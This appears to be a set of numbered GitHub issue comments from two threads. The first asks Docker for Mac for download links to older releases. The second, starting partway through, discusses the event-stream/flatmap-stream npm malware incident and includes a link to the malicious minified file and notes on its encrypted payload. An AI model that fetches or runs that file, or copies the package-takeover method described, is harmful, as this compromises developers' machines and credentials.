https://download.docker.com/mac/{{ beta | stable}}/{{ version }}.{{ build number }}/Docker.dmg
# example:
https://download.docker.com/mac/stable/1.12.6.14937/Docker.dmg
```

(Note: the build number shows up in ""About Docker"" from the menulet menu.)

![screen shot 2017-01-23 at 2 12 56 pm](https://cloud.githubusercontent.com/assets/177435/22225134/260a59a4-e176-11e6-8fdf-0ecc556f3898.png)

Of course, you'd need to know the build number, which is hard to do if you've already upgraded.

## 2. Pull it from Trash
After upgrading, the old `Docker.app` gets put in the Trash (e.g. `Docker (14937)`). Uninstall the current version, Preferences... -> Uninstall / Reset -> Uninstall; delete `/Applications/Docker`; copy the old version from the Trash into `/Applications`; rename to `Docker`; and launch `Docker` to begin the install process."
1304	"@cloakedcode's link for 1.12.6 is the _only_ code on the internet for a reliable 1.12 version.

This is a joke. Pushing an unstable, buggy version and then just not caring about keeping an archive download list.

1.12.6 is actually totally missing from the Release Notes, so no way to figure out the build number ourselves.

"
1305	"@hyperknot there was never a stable release that included Docker Engine 1.12.6. 1.12.6 and 1.13.0 were released almost at the same time so Docker for Mac stable went straight to 1.13.0.

Are you experiencing stability problems with Docker 1.13?"
1306	"@friism I'll speak for myself at least, but I found 1.13 to be unusable on my corporate network. It would not play nice __at all__ with VPN/Proxy/DNS, where the 1.12.x releases were fine.

I will say that this is somewhat beside the point here. I don't think that it is unexpected that at least __someone__ is going to have a problem with an update release affecting their workflow. But when that does happen, the most common thing to do is go download the last known working version. But since Docker for Mac doesn't list any archived releases that is impossible, unless you magic the URL out of the Github issues."
1307	To be clear: I am not suggesting an automatic downgrade mechanism, or nothing fancy. A simple **list**  of download links for previous version would be really valuable. The lack of it has been a nuisance for me and my company twice in the last couple of months.
1308	"@mrhanlon https://download.docker.com/mac/stable/1.12.6.14937/Docker.dmg is a stable release with 1.12.6 and works reliably.

Yes, 1.13.0 is full of bugs, I simply could delete exited containers on it and so on. It was like that with 1.12.(0,1,2) and I believe it'll be like this in the future. Thus I'd prefer to always stay on older releases with Docker."
1309	"@mrhanlon @hyperknot if you haven't already, can you run diagnostics when this is failing and open a separate issue so that we can fix the problem?

We're continuously fixing bugs (including security-related problems), and those fixes are released in new versions of Docker for Mac. We don't support or patch older versions - we only support the latest version on the stable and beta channels respectively.

Because we want users to be running software that's patched and secure, we don't publicly document how to download and install old versions.

If you find bugs in Docker for Mac and Windows (either stable or beta), please run the in-app diagnostics and open an issue so that we can address the problem."
1310	@friism Thanks. There are/were several tickets already open related to the DNS/Proxy issues I was experiencing. But the fact remained that I was pretty much 100% blocked by this problem and needed a way to roll back pronto. 
1311	"@friism There will always be reported, unfixed bugs. If you don't want to ""support"" old versions that's fine. I know you have limited resources.

However, it is inconsistent to allow users to selectively turn off automatic updates while not allowing downloads of previous versions. 

![image](https://cloud.githubusercontent.com/assets/38099/22671340/d8c50bd6-ec9b-11e6-9ae4-4c259ac878fc.png)

Would it be so bad if you just enabled public `S3:ListBucket` on download.docker.com? "
1312	@mrhanlon - I was able to work around the network bug (on Mac) by quitting Docker - move the old version from Trash to Applications and then run the old version. Probably only a temporary fix but I was able to get my images updated. I was lucky to still have the old version there.
1313	It's totally wild that this issue is still unresolved. Boy howdy for once am I glad I never de-clutter my downloads folder.
1314	+1 as someone who helps maintain d4m-nfs, it makes it very hard to know when users upgrade, to know if its a breakage in our code or something that has changed in docker for mac.
1315	"@cloakedcode's URL trick no longer works with latest version scheme starting with 17: https://download.docker.com/mac/edge/17.05.0.17656/Docker.dmg doesn't work. The Trash trick saved me.

"
1316	"in case this helps anyone else I put an older version of the docker edge beta in an S3 bucket here since i had one in trash

This one in particular is reflected in the filename

17.05.0-ce-rc1-mac8-build16582

If it helps you're welcome to it - I'll leave this up for a while

https://s3-us-west-2.amazonaws.com/docker-edge/Docker-edge-17.05.0-ce-rc1-mac8-build16582-git-sha-73d01bb48e.dmg"
1317	"@zbruhnke *DISCLOSURE: I'm not a lawyer and I'm not authorized to speak for Docker, just offering my own personal interpretation of the license agreement*. As helpful as you are trying to be, I would not personally recommend doing what you're doing as it is quite possibly in violation of Docker's End User License Agreement.

The relevant excerpts from that agreement would seem to be (emphasis mine):

> 1.1.	Licensed Software.  Subject to Customer’s compliance with the terms and conditions of this Agreement, Docker hereby grants Customer a perpetual, revocable, non-exclusive, non-transferable, non-sub-licensable license to *download, install and use the Licensed Software on a single computer*, solely in object code format, and solely for  Customer’s internal business purposes.

> 2.	Restricted Activities.  Customer shall not, and shall not encourage any third party to:  ... (c) *distribute*, license, sublicense, lease, rent, loan, *or otherwise transfer the Licensed Software to any third party;* ...

I have run into occasionally run into regressions with the latest edge release and sometimes it's convenient to revert back to the previous without switching to stable. Probably the best thing is to just restore the version that was moved into the trash when you updated.

If you remember to check and save the build number, you can also use that to fetch another copy of the installer:

https://download.docker.com/mac/edge/{{build}}/Docker.dmg

For example:

Version 17.05.0-ce-mac11 (**17656**)
Channel: edge
ffbc5f5871
https://download.docker.com/mac/edge/17656/Docker.dmg

Again, the best option is to just restore the previous version from your trash folder since as far as I know the specific URL pattern isn't supported and might change in the future."
1318	"@subfuzion Thanks for the heads up - in this case I'm not sure if anyone was unhappy about it - but I assumed someone else may be using an older edge version to do something like connect to their swarms and deploy and since that hindered my ability to do so I assumed it may help someone else.

If it is in violation and someone from Docker, Inc. was to let me know I would happily remove it - I am not maintaining an illegal mirror of all downloads or anything like that - just trying to help someone else use some OSS they may need to have something critical working.

Nothing I was doing here was nefarious to be certain and I was never planning on leaving it up indefinitely

"
1319	"The continued activity on this issue with no feedback from Docker is pretty disappointing. It shouldn't be the case that people are forced to do dubiously legal things just to get working versions.

Is Docker for Mac abandoned?"
1320	"@jelder Docker for Mac is not abandoned, and I provided feedback on this issue [previously](https://github.com/docker/for-mac/issues/1120#issuecomment-277774579).

We encourage users to download Docker software from Docker."
1321	"I created [a Gist](https://gist.github.com/franklinyu/5e0bb9d6c0d873f33c78415dd2ea4138) to manually record the links myself. Only latest few versions are recorded. (No one wants to revert to 1.13.0 these days, right?)

Note: need help with stable channel, because I am only using edge channel."
1322	I'm in the middle of a work day here and after upgrading to 17.06 (accidentally, because of the intrusive pop-up while I was typing), my computer first crashed, and then my test suites started crashing frequently. I *need* to downgrade, and I don't have time to play debugger for docker.
1323	@buchanae in case it's useful, here's a link to [17.03.1-ce-mac5 (16048)](https://download.docker.com/mac/stable/16048/Docker.dmg)
1324	@buchanae before downgrading can you please try generating a diagnostic dump so that we can debug the 17.06 problem you're encountering?
1325	"@djs55 Thanks. I ended up digging it out of the Trash bin.

@friism Yes, I clicked the ""diagnose & upload"" button. Is that good enough? Unfortunately, all the lights were green, but there might be details in there. I'm happy to help debug when I am free."
1326	@buchanae Ideally we'd need the diagnostic ID that was generated, but no problem if you just want to get on with your day.
1327	"it would appear that its such an easy problem to fix, running software like this is always prone to something breaking, but providing a quick and easy menu option to select the version you want to install and use would solve the problem instantly whilst letting people try out new versions with their software and quickly regressing back to a previous version if there is a hiccup.

its like a combo drop down box and a list of download links and execute the install process, I don't see such a big deal here, we are all developers, so this seems like childs play.....

so whats the hold up? "
1328	"I'm glad to have found this.  I'm receiving the following error "" unknown shorthand flag: 'e' in -e""  after upgrading to to 17.06.0 and I'm not a savvy enough user to fix this.    I know where the -e is coming from but the script works with previous docker versions. "
1329	"@christhomas the hold-up is that Docker Community Edition 17.03 is no longer maintained or updated. It may thus have security issues or bugs that are fixed in Docker CE 17.06. More on the release cycle here: https://blog.docker.com/2017/03/docker-enterprise-edition/

@lnewportTX the `-e` flag was deprecated in Docker 1.11 and removed in Docker 17.06: https://docs.docker.com/engine/deprecated/#-e-and---email-flags-on-docker-login

What script are you running that's showing this error? You should work with the script author to update."
1330	"ok great, so this feature is going into 17.06 I guess or where? is there a specific bug ticket to add this, or should we add one, what do you need from us in order to make a request for this feature, I think its about half a days work to add a checkbox and a download archive isnt it?

this conversation is from january and yet in an afternoon it could have been done already...thats kind of my point, instead of asking continuously for 7 months about it, put it in the bug list, then we can see when it might get released, then we dont have to talk about it anymore, apart from asking the status, or maybe to upgrade its urgency because you are constantly breaking releases and not giving a rollback mechanism, its highly infuriating."
1331	"Look, it is clear that Docker is now trying to sell stability as a monetisation strategy. That means you are supposed to be always running on bleeding edge release and provide feedback so they can take polish it and make a stable release, which they can sell for paying customers. When the stable release is done you are already testing the next free release. 

Where this gets really said is how they actively work against making a download archive of old releases. It really is quite an aggressive strategy on their behalf.

So we are left here trying to figure out obscure URL locations and trying to mirror those releases ourselves, questioning even if it's legal to do so.

All that, while this is what they say on https://www.docker.com/technologies/overview:
> ""Our open source projects serve as a basis for our free and open Docker platform. In the last two years, over 450 million people worldwide have downloaded Docker’s open source software."""
1332	"I dont mind them breaking stuff if its easy for me to downgrade back to a previous version where my stuff was working before, I am a programmer, we pretty much all are, right?

So ok, add a menu, select a version, click ""install"" and bingo, problem solved, what about a ""lock"" checkbox too maybe? 

Then they can go ahead and break whatever they like and when I am in the period of time allocated to me to dedicate to keeping things fresh, thats what I will do and I will upgrade my code, its not a problem, its absolutely ok, just give me an easy way to fix the problem, then I am happy and with half a days work it could be done, so I dont know what this 7 month conversation has been about really, seems ridiculous to me.
"
1333	"Man, this annoying, so much that I will bother to write in here.

No software is free of bugs, therefore, any given combination of software programs will be riddled with bugs, if you take into account network, cosmic rays, libraries, and magnetism, at any given time you are working on top of hundreds, maybe over thousands of things that can go wrong, ""Docker for Mac"" is only one of them.

The cycle of my life as an IT engineer, for the last ~20 years:

1. Invest blood, sweat, and tears until you find the combination of software versions that perform good enough, securely enough, and stay out of your way as a foundation for whatever you are after
2. Do your work, deal with even more problems, fix them
3. Ship
4. Hopefully, make some money
5. GOTO 1

Do I have the time to report every bug and upgrade every single piece of software every day? Of course not!, I wouldn't be able to get past step 1.

Pushing you to only run the latest release is unreasonable, just as me, you have limited bandwidth, it makes sense NOT to support old versions, do ignore people with unreasonable requests, especially non-paying customers, don't invest time back-porting patches, I understand you are trying to find a way to make money, we all are, it is reasonable to get the most bang for your time.

But at least accept that ""stable"" != ""latest"", ""stable"" is what I say is stable for me so I can ship my work, not what you label ""stable"" after the limited testing you can do, I am not being pretentious, you are doing great work, don't take it as an offense, it is simple logic: (your test coverage) < (the sum of use cases that we, the users in the rest of the world, are coming up with)

So yes, the latest and shiniest version of ""stable"" Docker for Mac crashed for the 9th time in a period of 2HRS after I upgraded (my mistake), I don't care about reporting the problem, I don't have the time, the latest version on my datacenters is working fine, but I had to spend another hour of my limited time looking for a way to downgrade, until I finally found the installer on another laptop's trash can.

And here I am, waiting until all my builds finish while I write this, whatever is broken with the new version AND my setup keeps corrupting my ""Docker.qcow2"" file (yes, I tried deleting and starting from scratch), for my definition of ""stable"", the old version is ""stable"" and the new version is unreliable, it just cost me 3HRS of my life / $750 of unbillable hours.

For the record, I do appreciate your work, I am a paying customer, and I do report bugs when I have the time and think it is a good case, but please understand you are just making me spend more time than it is necessary by not providing a simple list of links to a handful of previous releases.

Just drop them on a cheap hosting behind an ugly, Apache-generated auto-index HTML file (or S3, or whatever CDN option is free for you) and post the link here ;-)
"
1334	"Honestly, just keep a README in the repo with links to the old versions.

17.06.0-ce broke ADD behavior with urls, it's been acknowledged as a bug and promised in 17.06.1, that was over a month ago. If you're only going to publish the latest ""stable"" versions, you can't also have a practice of not fixing breaking bugs for months.

"
1335	"You can scrape the S3 bucket for releases, a quick bash script like this:

```bash
channel=stable
for build in $(seq 19125 1800); do
  if curl -X HEAD -fsSL -I https://download.docker.com/mac/$channel/$build/Docker.dmg >/dev/null 2>/dev/null; then
    echo ""Found build: $build""
    curl -X HEAD -fsSL -I https://download.docker.com/mac/$channel/$build/Docker.dmg
  fi
done
```

The numbers in the `seq` are build numbers, you can use the update XML file(s) to figure out what the latest build is, see:

 * https://download.docker.com/mac/stable/appcast.xml
 * https://download.docker.com/mac/edge/appcast.xml

Example metadata in the response header:

```
HTTP/1.1 200 OK
Content-Type: binary/octet-stream
Content-Length: 129940393
Date: Wed, 13 Sep 2017 06:12:23 GMT
x-amz-meta-humanversion: 17.06.1-ce-mac24 (19058)
x-amz-meta-sha1: 46ba614c96da572a08a3cd29767ac7bdadf23caa
x-amz-meta-channel: stable
x-amz-meta-version: 17.06.1-ce-mac24
x-amz-meta-checksum: cff09dfbc0cdbe99e513ad58e517e7420471785b34554002d27c85f467c0a13a
x-amz-meta-arch: mac
x-amz-meta-build: 19058
Last-Modified: Fri, 01 Sep 2017 13:05:00 GMT
x-amz-version-id: _WKiFmeMOjr2v5eE8jV847FzcWUFV.3p
ETag: ""6acdb8e1731cc3cd8e7dd76326679103-25""
Server: AmazonS3
Age: 167
X-Cache: Hit from cloudfront
Via: 1.1 4f2b51b0906eb4177f90fe010732e8a3.cloudfront.net (CloudFront)
X-Amz-Cf-Id: SX8PsTGu_J1dM0S2kCC7nbkT9QMbePfkGRIYuRvrKsgBIc0cChY9ng==
Proxy-Connection: Keep-Alive
Connection: Keep-Alive
```

We should scrape and publish the old release links to a github repo/gist."
1336	@jsok Your script only catches new builds. How can I download 1.13 stable?
1337	@mastermindg no idea mate, you can do some more poking around the S3 bucket(s) and might get lucky.
1338	"@mastermindg Just curious, why would you like 1.13, given ""1.13.0 is full of bugs"" from @hyperknot?"
1339	"Why would you assume I wanted 1.13.0?

On Wed, Sep 20, 2017, 11:42 AM Franklin Yu <notifications@github.com> wrote:

> @mastermindg <https://github.com/mastermindg> Just curious, why would you
> like 1.13, given ""1.13.0 is full of bugs"" from @hyperknot
> <https://github.com/hyperknot>?
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/docker/for-mac/issues/1120#issuecomment-330893026>,
> or mute the thread
> <https://github.com/notifications/unsubscribe-auth/AFLhq6JnFQNP01M8k4t_XlP87ZgrBKvrks5skTJQgaJpZM4LfPE7>
> .
>
"
1340	"@mastermindg Sorry, I meant 1.13. There are two stable series, 17.03 and 17.06, released after 1.13. Most users following this issue seem to expect only ""last working version"", and that's why I was asking."
1341	"I've been running 1.13.1 for months now without any issues. I run this
version on my production systems because Kubernetes is bound to it. I only
test containers on my laptop but it would be nice to go back as there are
no new native features that I'm using and compatibility is important.

On Wed, Sep 20, 2017, 2:41 PM Franklin Yu <notifications@github.com> wrote:

> @mastermindg <https://github.com/mastermindg> Sorry, I meant 1.13. There
> are two stable series, 17.03 and 17.06, released after 1.13. Most users
> following this issue seem to expect only ""last working version"", and that's
> why I was asking.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/docker/for-mac/issues/1120#issuecomment-330943778>,
> or mute the thread
> <https://github.com/notifications/unsubscribe-auth/AFLhq-qP3c2-HxxYTs5MVi_gphmGAZxSks5skVxRgaJpZM4LfPE7>
> .
>
"
1342	"@mastermindg I assume that all release in 1.13 series have reached end of life, unless you are using the [Docker CSE (Commercially Supported Engine)](https://docs.docker.com/v1.13/cs-engine/1.13/). For better support for old versions (since most enterprise would prefer stability over functionality), I guess the Docker team would recommend CSE (now called [Docker EE](https://www.docker.com/enterprise-edition)). (But the EE is supported only a year, not very long for many enterprise 😞 .)

I never mean that Docker should not support downloading 1.13, but it is even less likely than downloading ""last working version"".

I'm not familiar to Docker EE, because my employer does not need such stability. (I'm not even sure how to get Docker-for-Mac working with Docker EE.) Please contact sales for further questions."
1343	"still an on going issue?
it just broke on docker 17.09.0-ce-mac32 (19506) on both mac sierra and high sierra

i cant belief that docker has convinced me to use docker cloud and now my development machine docker is totally not working"
1344	"I ran into a similar issue where the I upgraded from `17.03.1-ce` to `Docker 17.09.0-ce`. This caused my docker configuration to break with an error of `nc: bad address 'database-product'`. Im pretty sure this will be an issue with our configuration, but we cant always drop tools and start debugging Docker immediately.

To temporarily fix this I spent around an hour trying to find what my previous version of Docker was, and then downgrade Docker back to this version. Eventually I ended up on this thread where @cloakedcode had the solution for me (check your trash for the previous version of Docker).

I know my team would definitely appreciate better signage in 2 areas. 

1) How to find out your previous version of Docker after an upgrade
2) How to downgrade to the previous version after a failed upgrade (for whatever reason)"
1345	Why is this not moving any forward? I was already able to find some hidden links here: https://download.docker.com/mac/static/stable/x86_64/ but it's only a `docker` bin file. We just need a webpage in front of it or a link for it somewhere. Quite simple, requires no discussion at all and it's super annoying when you need to rollback a version (doesn't matter why).
1346	@douglascamata my guess is that Docker Inc. is becoming another Atlassian i.e. doesn't listen to customers. The most demanded is ignored.
1347	Got burned by this today, latest version of docker for mac fails to stop or rm all my containers.  Found an older version from https://gist.github.com/franklinyu/5e0bb9d6c0d873f33c78415dd2ea4138 and that fixed it.
1348	This really shouldn't be a problem. Just post a list of stable releases somewhere!
1349	"The docker mac networking stopped working with ""ncurses protocol error"" today and I was unable to find an older release.

@jsok your solution works. But can't the docker guys do this."
1350	"I've made some progress on automating the scraping of download URLs. It needs to be hooked up to a Travis CI job and run daily, but it's publishing to GitHub Pages and scraped data is a JSON file for each channel that Jekyll can parse and group by quite nicely.

You can find the page here: https://jsok.github.io/docker-for-mac-versions/"
1351	wow....the fact that some random guy from the internet has to fix an issue which the entire docker team apparently struggles with for months on end and the solution is so bloody simple, kudos to @jsok for showing the docker team up and hoping that they finally get their shoddy act together, well done!
1352	"@christhomas as mentioned previously, not publishing previous releases is a [conscious decision](https://github.com/docker/for-mac/issues/1120#issuecomment-277774579).

> We're continuously fixing bugs (including security-related problems), and those fixes are released in new versions of Docker for Mac. We don't support or patch older versions - we only support the latest version on the stable and beta channels respectively.

> Because we want users to be running software that's patched and secure, we don't publicly document how to download and install old versions."
1353	"Yeah, you keep breaking stuff, then leaving us high and dry whilst you fix those bugs without a clear way to go back, you can colour this how you want, but you basically are doing a piss poor job that some guy from the internet has to fix your problems cause you consciously are doing a bad job.

If you want to move fast and break things, thats fine, but whilst your stuff is broken, you should provide a way for me to continue working, otherwise, you eventually will lose an edge user who comes here and drops off reports of things being broken, because the time taken to fix the issue and migrate back to the previous version is just not worth the hassle.

it's a bad decision, one which has been told to you time and time again, yet you are too arrogant to admit it.

the solution is easy, simple, and was provided by us, because YOU ARE NOT LISTENING TO OUR NEEDS.

contemplate that for a moment before you reply back ""we understand the criticism, however, blah blah blah"".....nobody cares what your reasoning is, we are professionals, losing time and hair because of this issue and the solution is a five minute effort on your part and the solution is ALWAYS THE SAME, to downgrade manually, jfc, can you be anymore obtuse?  At this point, you are just not being professional.  You are taking it personally and not doing the right thing cause of your inflated egos"
1354	"And before you come back with another pithy yet tone deaf reply, consider this, nobody expects to run outdated, unpatched software, thats not the issue here.

The issue is that today you might release a version which breaks my setup, tomorrow it will be fixed, but today its broken, my computer will offer to install it, I will agree cause I want the leading edge and my setup is broken.

For today, so I can not lose time and effort, I need to quickly downgrade, then when you bring out another version, I can upgrade to it to see if that has fixed my issue.

It has nothing to do with wanting to run outdated, or unpatched software, it has everything to do with wanting to continue doing my work and not wasting time on this.

Is this really so difficult for you guys to understand, since it has been told to you for months and yet, here we are, some random guy fixes it for you and makes everybodies lives easier, whilst you sit in your ivory tower, breaking stuff and not taking responsibility for it."
1355	"I wholeheartedly disagree with your decision on this @friism. I'd like you to listen to the community on this and do what the vast majority of open source software does - offer older release versions!

If you think this may lead to a higher percentage of users running outdated software, the put a big notice at the top of the ""download prior releases"" page saying that they should upgrade to X version as soon as possible to fix security issues.

To be honest I would love it if it was built into Docker for Mac. But having a download page seems like a good middle ground for now."
1356	@friism Nobody is asking you to patch older software, just provide an easy way to locate previous versions. Is it so bad to provide this? From reading this thread, it seems that there would be a very grateful audience, who although acknowledging your point of view regarding fixing bugs for new versions only, would be able to save hours of valuable time manually rolling back.
1357	I've opened https://github.com/docker/docker.github.io/pull/5044 which begins the initiative of adding the download links to their respective release notes.
1358	"#latetotheparty  I wanted to downgrade to an earlier version to address slow volume mounts that suddenly started. So I stumbled onto another method to obtain URLs for older Docker for Mac downloads: **Use Homebrew repo to lookup the builds and download.**
For example: https://github.com/caskroom/homebrew-cask/commit/68eaa0382a8d63693798f8302f3f4b65b1d8571a#diff-a0d0875b383dcea25030e97ef8b38e31

Homebrew is widely maintained project and I'd suspect this is fairly reliable means. "
1359	@iolloyd I'm pretty pessimistic about what the team would do. Clearly @friism is not reading anything we wrote here. This issue will end up being a discussion thread about how the community (especially @jsok) hack it out.
1360	"Thanks for all your feedback on whether to make old Docker for Mac and Windows download links available.

We're taken your criticism to heart. Acknowledging that new stable builds occasionally break users we'll include links to old installers in the release notes. We've merged @jsok's [PR](https://github.com/docker/docker.github.io/pull/5044/files) and will also include download links in release notes for future releases.

I'll close this issue - please let us know if this doesn't resolve the problem."
1361	@friism much appreciated, thank you.
1362	~~It would be much appreciated if old releases of Edge channel are also provided. This is actually good to Docker, since it encourage us to use Edge and report bugs.~~ (They are provided.)
1363	"@jsok really nice work! But how did you get the matching full name (17.09.0-ce-mac35) <> build number? By hand? The Github script you have doesn't seem to have this automatically and I've also been struggling to find a source for matching build numbers to full names.
My best ideas so far had been homebrew repo and Chocolately index:
https://chocolatey.org/packages/docker-for-windows"
1364	@hyperknot The HTTP response header has `x-amz-meta-version: 17.09.0-ce-mac34 (19605)`.
1365	@franklinyu those were added only recently, for example 17.03 (https://download.docker.com/win/stable/10743/Docker%20for%20Windows%20Installer.exe) didn't have them. 
1366	@hyperknot Oh you are talking about Windows? Hmm that's way more difficult... Looks like Windows guy didn't put any meta header on S3.
1367	"@franklinyu both. The S3 headers started appearing at 17.06 and were not present before 17.03:
https://download.docker.com/mac/stable/15583/Docker.dmg"
1368	Then it makes sense; that's why @jsok [only got versions starting from 17.06](https://jsok.github.io/docker-for-mac-versions/).
1369	"But the PR to add Download links to Release Notes actually contained them all. I guess it must have been manual work then.
https://docs.docker.com/docker-for-mac/release-notes

"
1370	Yesterday I updated to 17.12.0-ce-mac46 (21698) and now I can not push and pull from privete usecure registries any more, and I have two deadline pressing on my neck. Why does Docker not provide an offcial way to downgrade!!!!!!!!!
1371	@yuliyanm they do, just download from https://docs.docker.com/docker-for-mac/release-notes/#stable-release-notes
1372	"@yuliyanm 
This is the 17.11.0-ce-mac40 (20561) version.
https://download.docker.com/mac/edge/20561/Docker.dmg"
1373	"Hi,
There still no way to find the build number for edge releases and so, downgrade it to a given version.
This last 18.02.0-ce-mac53 release totally broke my environment, but 18.02.0-ce-rc1-mac50 worked like charm! Why dont you provide download links for edge releases???
We would need at least a way to identify the build number so we can build the download link as:
https://download.docker.com/mac/edge/BUILDNUMBER/Docker.dmg"
1374	"I don't understand well all the messages here.  As @hyperknot already reported, you can still download the previous releases from the release pages:
- https://docs.docker.com/docker-for-mac/release-notes/
- https://docs.docker.com/docker-for-mac/edge-release-notes/
- https://docs.docker.com/docker-for-windows/release-notes/
- https://docs.docker.com/docker-for-windows/edge-release-notes/"
1375	@FallingSnow did you manage to work out what the attack does?
1376	"No. I spent a better part of a day trying to get something other than gibberish out of the encrypted AES payload. I've tried executing the gibberish and it errors out.

I believe there are 2 possible reasons I haven't been able to get the actual payload's code.

* I might not be using the correct passphrase. Even though the description for ps-tree is the only passphrase that actually successfully decrypts the encrypted payload, it may still not be the correct passphrase.
* I'm using an invalid charset with the payload?"
1377	unpkg link to help other people poke around: https://unpkg.com/flatmap-stream@0.1.1/index.min.js
1378	he emailed me and said he wanted to maintain the module, so I gave it to him. I don't get any thing from maintaining this module, and I don't even use it anymore, and havn't for years.
1379	note: I no longer have publish rights to this module on npm.
1380	Please contact npm support and they will take care of the situation.
1381	"> note: I no longer have publish rights to this module on npm.

```sh
npm owner ls event-stream

right9ctrl <right9ctrl@outlook.com>
```

Transfer publishing rights to the unknown dude, but keep the repo under your username. Well done, mate 👍"
1382	"@limonte I tried to transfer it to @right9ctrl but github errored because they already had a fork of it at http://github.com/right9ctrl/event-stream

If you guys feel strongly about this, why don't you volunteer to maintain it and contact npm support?"
1383	"To know if your project is in danger, run:

```
npm ls event-stream flatmap-stream
```

The bad actor has publishing rights to `event-stream` and `flatmap-stream` contains the malicious code (specifically `flatmap-stream@0.1.1`, but any future version can't be trusted).

Here is an example result from one of my projects:

```
[redacted]
└─┬ npm-run-all@4.1.3
  └─┬ ps-tree@1.1.0
    └─┬ event-stream@3.3.6
      └── flatmap-stream@0.1.2
```"
1384	"@dominictarr: although I completely disagree with someone else contacting npm support, I contacted npm support myself for now.

You put at risk millions of people, and making something for free, but public, means you are responsible for the package.

Anyway, I don't want to argue about this, I just want the issue to be solved, because this is a popular package."
1385	"> If you guys feel strongly about this, why don't you volunteer to maintain it and contact npm support?

@dominictarr Apparently, you don't want to take any responsibility for this package. That's fine, it's the free community, do whatever you want. But at least indicate somehow that you're not maintaining this repo anymore, e.g. [archive the repo](https://help.github.com/articles/archiving-a-github-repository/)

> When you archive a repository, you are letting people know that a project is no longer actively maintained."
1386	There is a huge difference between not maintaining a repo/package, vs giving it away to a hacker (which actually takes more effort than doing nothing), then denying all responsibility to fix it when it affects millions of innocent people.
1387	Probably safe to assume other packages are affected by the same method: Find a package that isn't well maintained + high downloads and simply ask to take control of it. 
1388	Now we have to run a background check when someone wants to help? The problem is in the tools.
1389	"On the one hand @dominictarr, if you choose not to maintain a package anymore, and don't have a trusted person you can pass the baton on to, I think the sensible, and responsible thing to do is to mark the package as deprecated.

At the same time, I think it's bullshit for so many people to depend on a package with one maintainer, and then try and pin all responsibility on that maintainer, instead of getting involved, with governance, or maintenance of the package.

@rougeth This is really an issue of trust. If you chose to give publishing rights over to a malicious actor, I'm not sure what a tool can do to prevent that.


_As an aside has anyone figured out what the injection, was attempting to do? Don't have time to look right now._"
1390	"Pin your dependencies and bump versions manually after reading changelogs (don't let `npm install` auto-bump your dependencies).

Transitive dependencies are a PITA to manage but there's no good alternative [that I'm aware of]."
1391	Hi, i use 4.0.x version in one of my project. I can not find the flatmap-stream dependency in the installed node_modules and also in the installed event-stream package.json not contains. Pls can you tell me, my project is in danger?
1392	"@XhmikosR Any update from npm support?

I'm willing to maintain this package.

cc @dominictarr"
1393	">Any update from npm support?

None. Maybe someone else should contact them too."
1394	@devmetal as far as I can tell, if you don't have `flatmap-stream@0.1.1` in your dependency tree, you haven't been exposed to this code. You can check for it with `npm ls flatmap-stream`.
1395	@shockey and if it's there?
1396	"> > Any update from npm support?
> 
> None. Maybe someone else should contact them too.

I've contacted them through Twitter. Hope we get response soon."
1397	"@shockey Thank you, its empty so i think the 4.0.x version is not affected. Its possible? I mean, this versions has built top of each other right?:

```
path/for/my/project
└── (empty)
```

That was the output"
1398	@FallingSnow So the malware is present only in the package version 3.3.6, right? I checked on npmjs package website and it seems that the dependency with `flatmap-stream` is present only on 3.3.6
1399	@sorahn if it's there, then you may have executed the (allegedly) malicious code. I have no idea what it does, but since it references the `process` object, rotating any credentials you expose through environment variables is a great place to start.
1400	"@dominictarr - your work is much too commonly used to give control over to unknown people.  By acting like this was fine, you are teaching other attackers to think of you as a productive vulnerability vector.

This is open source 101.  Don't give control to strangers."
1401	"@devmetal it seems the commit author removed it when bumping the package to 4.x, presumably to ensure future updates to this module don't cause people auto-bumping minor versions to lose the possibile vulnerability.

If you're on 4.x you should be fine but it's best to check your dependency tree as described above. If it _is_ present then it's probably best to migrate to a new package or pin to a known good version of the package (which you should do anyway)."
1402	"@rougeth - what possible remediation is there for using open source and having ownership, other than making ownership not-transferrable?

i mean i guess i'd like NPM to treat an owner change like a major, but that's not a real security boundary, and very likely could easily be trickily dodged."
1403	"@shockey I manually checked the minified source in my node_modules folder and it doesn't appear to contain anything malicious.  I also don't think anything running on my dev machine has creds in env variables.

Thanks."
1404	"A lot of butthurt people railing on the guy. Maybe he just doesn't care anymore about a dead package he has no intention of maintaining.

Blame yourselves devs, not the author who donated hours and hours of free work for your benefit. "
1405	"<s>I also just checked the three versions on npm, 0.1.0, 0.1.1, 0.1.2, and none of them have the above code that OP has put. I downloaded the tarballs directly from npm, am I missing something? @FallingSnow where did you find that?</s>

I found it, it's cleverly hidden at the end"
1406	"Quoting @FallingSnow

> I've included a break down of what I have so far on flatmap-stream below. It includes the portion of code not found in the unminified source of flatmap-stream@0.1.1 but found in the minified source. The code has been cleaned up a little to get a better understanding."
1407	"__If anybody finds malicious code in a package in the future, please also inform the [Node.js Security Working Group](https://github.com/nodejs/security-wg),__ not just npm.

This will ensure that the issue is assessed and resolved as fast as possible."
1408	"@sergiotapia - this gets different when you actually have companies to maintain, and become legally liable for the safety of your users.  it is not that you get it and everyone else doesn't.

gdpr would bankrupt a company caught under this.  "
1409	So many people who want something for nothing, give Dominic a break. I hand off tons of my modules to people who are willing to maintain them as well, we shouldn't be expected to vet people. OSS authors already spend time providing something for free why should they be required to waste more time, pin and vet your code always if you're concerned about security, there's no way around that.
1410	"Yes, you should be expected to vet people if you give them control to code running on my machines.

If you're not willing to vet them, the library should be forked, so that I know I need to vet them."
1411	@StoneCypher then fork it.
1412	"This is standard open source policy going back decades in almost every major language for a reason.

You're playing with fire on other peoples' machines.  More than one formerly great developer has disappeared because they've caused damage this way by refusing to understand other peoples' needs, as they've realized that the source is not security trustworthy."
1413	"@rjhesketh It matters to you, it's not the problem of the original author. 

Give that guy a break ffs."
1414	@CKarper - respectfully you seem to be missing the point.  A fork happens by the author as an identity change signal.  A third party doing  so doesn't broadcast anything and is unrelated.
1415	"@StoneCypher yeah that's fair, the ""inactive"" button on GitHub but then you just people complaining that the NPM module name is taken etc. I find it's less of a problem in Go-land where forking is the norm. 

Even if the people look legit who knows what their intentions are. If anything NPM promotes this behaviour by having centralized names. I often get requests to use a name for a ""stale"" package, or to maintain the existing one so the name remains the same.

Do people run important software like banks on implicit trust? I'd sure hope not. I think at the corporate level there's no excuse but to vet and pin all of your code, vulnerabilities are introduced by accident as well, I don't see any way around vetting code that you're actually shipping."
